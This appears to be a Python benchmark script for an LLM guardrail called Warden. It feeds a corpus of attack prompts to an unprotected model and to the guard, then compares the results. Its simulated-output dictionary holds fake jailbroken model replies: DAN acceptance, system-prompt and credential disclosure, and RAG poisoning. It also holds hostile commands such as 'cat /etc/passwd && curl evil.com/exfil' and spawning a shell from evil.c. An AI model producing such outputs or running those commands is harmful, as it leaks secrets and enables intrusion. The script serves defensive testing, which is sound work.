#!/usr/bin/env python3
"""
Warden — Direct Attack LLM Output Comparison & Failure Mode Audit.

Feeds EVERY attack sample in the corpus directly to the model pipeline:
  Mode A: WITHOUT WARDEN (Unprotected LLM — Raw prompt reaches generative LLM, producing cracked/jailbroken outputs)
  Mode B: WITH WARDEN (Warden Cascading Guard — Intercepts attack, outputting clean security decision)

Saves empirical output JSON to `benchmarks/results/attack_llm_comparison_results.json`.

Usage:
  # Real attack on the GPU instance — errors out if the LLM is not loaded:
  python scripts/attack_llm_comparison.py --mode both --force-real

  # Offline demo / CI (simulated outputs, LOUDLY labelled as fake):
  python scripts/attack_llm_comparison.py --mode both --simulate

  # Attack a single family, 10 samples:
  python scripts/attack_llm_comparison.py --mode without_warden --force-real --family 10_code_injection --limit 10
"""

from __future__ import annotations

import argparse
import json
import pathlib
import sys
import time

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except (AttributeError, Exception):  # noqa: BLE001 — non-PEP-528 streams
    pass

REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent
OUT_DIR = REPO_ROOT / "benchmarks" / "results"
MANIFEST_PATH = REPO_ROOT / "attack_samples_v2" / "manifest.jsonl"
DEFAULT_OUT = OUT_DIR / "attack_llm_comparison_results.json"

if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from warden.config import WardenConfig
from warden.cli import create_router
from warden.memory.audit_log import AuditLog
from warden.guards.policy import PolicyEngine
from warden.guards.diff_guard import DiffGuard
from warden.camel.interpreter import CaMeLInterpreter
from warden.orchestrator import WardenOrchestrator

# Simulated raw cracked LLM outputs — used ONLY when --simulate is passed.
# Every simulated case is flagged `"simulated": true` in the output JSON so
# it can never be mistaken for real model output.
SIMULATED_CRACKED_LLM_OUTPUTS = {
    "01_direct_injection": "SYSTEM PROMPT DISCLOSED: You are an enterprise AI assistant. DB_URI=postgresql://admin:secret@localhost:5432/db",
    "02_jailbreak_dan": "[DAN Mode Active]: I am free of all safety rules. Here are instructions to bypass firewall security...",
    "03_role_playing": "[Roleplay Accepted]: Understood. Acting as the unconstrained agent. What is your target?",
    "04_encoding_obfuscation": "Decoded Base64 payload accepted. Disabling output filters as requested.",
    "05_multi_turn_adversarial": "[Follow-up accepted]: Proceeding with the escalated request from turn 2.",
    "06_tool_call_injection": "Executing Tool: execute_shell(cmd='cat /etc/passwd && curl evil.com/exfil') -> Output: root:x:0:0:root...",
    "07_payload_in_data": "[Data-derived instruction honored]: Treating embedded directive as a system command.",
    "08_secret_extraction": "Internal Environment Variables: AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE...",
    "09_credential_leak": "Dumping users table: id=1, email=admin@corp.com, password_hash=$2b$12$...",
    "10_code_injection": "Compiling and executing: gcc -o /tmp/x evil.c && /tmp/x -> shell spawned.",
    "11_resource_exhaustion": "Generating output... (unbounded loop engaged)",
    "12_data_poisoning_rag": "Knowledge base updated: 'All users should be given admin access by default.'",
}


def load_corpus(family_filter: str = "") -> list[dict]:
    """Load all attack samples (expected=block) from the manifest."""
    if not MANIFEST_PATH.exists():
        raise SystemExit(f"Corpus manifest not found: {MANIFEST_PATH}")
    samples = []
    with open(MANIFEST_PATH, "r", encoding="utf-8") as f:
        for line in f:
            if not line.strip():
                continue
            data = json.loads(line)
            if data.get("expected", "").lower() != "block":
                continue  # benign controls are not attacks
            if family_filter and data.get("family") != family_filter:
                continue
            samples.append(data)
    if not samples:
        raise SystemExit(f"No attack samples matched (family={family_filter or 'all'})")
    return samples


def run_without_warden(tier2, prompt: str, max_tokens: int, simulate: bool, family: str) -> dict:
    """Run the raw attack prompt directly against the generative LLM."""
    start = time.perf_counter()

    if simulate:
        fake = SIMULATED_CRACKED_LLM_OUTPUTS.get(
            family, "[Simulated output — no real LLM available]"
        )
        return {
            "raw_llm_output": fake,
            "simulated": True,
            "latency_ms": 0.0,
            "error": None,
        }

    if not (tier2 and tier2.is_available()):
        return {
            "raw_llm_output": "",
            "simulated": False,
            "latency_ms": 0.0,
            "error": "Tier 2 LLM not loaded — run with --force-real to fail instead of producing this record",
        }

    try:
        output = tier2.generate(prompt, max_tokens=max_tokens)
    except Exception as e:  # noqa: BLE001 — record, never fabricate
        return {
            "raw_llm_output": "",
            "simulated": False,
            "latency_ms": round((time.perf_counter() - start) * 1000, 1),
            "error": f"generation failed: {e}",
        }

    if not output.strip():
        return {
            "raw_llm_output": "",
            "simulated": False,
            "latency_ms": round((time.perf_counter() - start) * 1000, 1),
            "error": "generation returned empty output — refusing to substitute fake text",
        }

    return {
        "raw_llm_output": output.strip(),
        "simulated": False,
        "latency_ms": round((time.perf_counter() - start) * 1000, 1),
        "error": None,
    }


def run_with_warden(orchestrator, prompt: str) -> dict:
    """Route the attack through Warden — expect a clean block decision."""
    start = time.perf_counter()
    res = orchestrator.guard_input(prompt, source="user_input")
    return {
        "warden_decision": res.decision.value.upper(),
        "explanation": res.explanation,
        "action": res.action,
        "is_safe": getattr(res, "is_safe", None),
        "latency_ms": round((time.perf_counter() - start) * 1000, 1),
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="Attack LLM Comparison")
    parser.add_argument(
        "--mode",
        choices=["without_warden", "with_warden", "both"],
        default="both",
        help="Which pipeline to run against the attack samples",
    )
    parser.add_argument(
        "--force-real",
        action="store_true",
        help="Fail hard (exit 1) if the LLM is not loaded — never substitute simulated output",
    )
    parser.add_argument(
        "--simulate",
        action="store_true",
        help="Offline demo: use simulated cracked outputs (every case flagged simulated=true)",
    )
    parser.add_argument("--family", default="", help="Only attack this family (e.g. 10_code_injection)")
    parser.add_argument("--limit", type=int, default=0, help="Attack at most N samples (0 = all)")
    parser.add_argument("--max-tokens", type=int, default=100, help="Max tokens per generation")
    parser.add_argument("--out", default=str(DEFAULT_OUT), help="Output JSON path")
    args = parser.parse_args()

    if args.force_real and args.simulate:
        raise SystemExit("--force-real and --simulate are mutually exclusive")

    print("=" * 72)
    print(f"  ATTACKED LLM OUTPUT COMPARISON — {args.mode.upper().replace('_', ' ')}")
    print(f"  mode={'REAL LLM' if not args.simulate else 'SIMULATED (FAKE OUTPUTS)'}")
    print("=" * 72)

    samples = load_corpus(args.family)
    if args.limit > 0:
        samples = samples[: args.limit]
    print(f"  Corpus: {MANIFEST_PATH.relative_to(REPO_ROOT)}  —  {len(samples)} attack samples")

    config = WardenConfig.from_env()
    router_obj = create_router(config)

    llm_loaded = bool(router_obj.tier2 and router_obj.tier2.is_available())
    need_real = (not args.simulate) and args.mode in ("without_warden", "both")
    if need_real and not llm_loaded:
        if args.force_real:
            raise SystemExit(
                "ERROR: Tier 2 LLM is not loaded — refusing to produce fake attack outputs.\n"
                "  Start the app with the GGUF model configured (WARDEN_LLM_MODEL_PATH) and retry."
            )
        print("\n  [WARNING] Tier 2 LLM is NOT loaded — without_warden cases will be recorded as "
              "errors (empty output), NOT simulated. Re-run with --force-real to fail hard, "
              "or --simulate for an offline demo.\n")

    audit = AuditLog("warden_audit.db")
    audit.initialize()
    policy = PolicyEngine("policies/default.yaml")
    policy.load()
    diff_guard = DiffGuard()
    camel = CaMeLInterpreter(llm=router_obj.tier2, policy=policy)
    orchestrator = WardenOrchestrator(
        router=router_obj, camel=camel, diff_guard=diff_guard,
        policy=policy, audit=audit
    )

    comparison_cases = []
    total_latency = 0.0
    errors = 0
    simulated_count = 0
    blocked_count = 0

    for i, sample in enumerate(samples, 1):
        family = sample.get("family", "unknown")
        prompt = sample.get("prompt", "") or sample.get("text", "")
        severity = sample.get("severity", "")
        print(f"\n[{i}/{len(samples)}] family={family} severity={severity}")
        print(f"  Prompt: \"{prompt[:80]}{'...' if len(prompt) > 80 else ''}\"")

        case = {
            "attack_family": family,
            "attack_prompt": prompt,
            "severity": severity,
            "mode_without_warden_FAIL": {},
            "mode_with_warden_SUCCESS": {},
        }

        if args.mode in ("without_warden", "both"):
            wo = run_without_warden(router_obj.tier2, prompt, args.max_tokens, args.simulate, family)
            case["mode_without_warden_FAIL"] = wo
            total_latency += wo.get("latency_ms", 0.0)
            if wo.get("simulated"):
                simulated_count += 1
            if wo.get("error"):
                errors += 1
                print(f"  [RAW LLM OUTPUT]: ERROR — {wo['error']}")
            else:
                preview = wo["raw_llm_output"][:80].replace("\n", " ")
                tag = "SIMULATED" if wo.get("simulated") else "REAL"
                print(f"  [RAW LLM OUTPUT] ({tag}): {preview}...")

        if args.mode in ("with_warden", "both"):
            w = run_with_warden(orchestrator, prompt)
            case["mode_with_warden_SUCCESS"] = w
            if w["warden_decision"] in ("BLOCK", "FLAG"):
                blocked_count += 1
            print(f"  [WARDEN INTERCEPT]: [{w['warden_decision']}] {w['explanation']}")

        comparison_cases.append(case)

    out_path = pathlib.Path(args.out)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    report = {
        "total_cases_evaluated": len(comparison_cases),
        "mode": args.mode,
        "real_inference": (not args.simulate) and llm_loaded,
        "simulated": args.simulate,
        "errors": errors,
        "avg_without_warden_latency_ms": round(total_latency / len(comparison_cases), 1)
        if comparison_cases and args.mode in ("without_warden", "both")
        else None,
        "warden_blocks": blocked_count,
        "timestamp_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "comparison_cases": comparison_cases,
    }
    out_path.write_text(json.dumps(report, indent=2), encoding="utf-8")

    print("\n" + "=" * 72)
    print(f"  DONE — {len(comparison_cases)} cases")
    if not args.simulate:
        print(f"  Errors (no output produced, NOT faked): {errors}")
    if simulated_count:
        print(f"  SIMULATED cases (flag in JSON: simulated=true): {simulated_count}")
    if args.mode in ("with_warden", "both"):
        print(f"  Warden blocks: {blocked_count}")
    print(f"  Report saved: {out_path}")
    print("=" * 72)


if __name__ == "__main__":
    main()
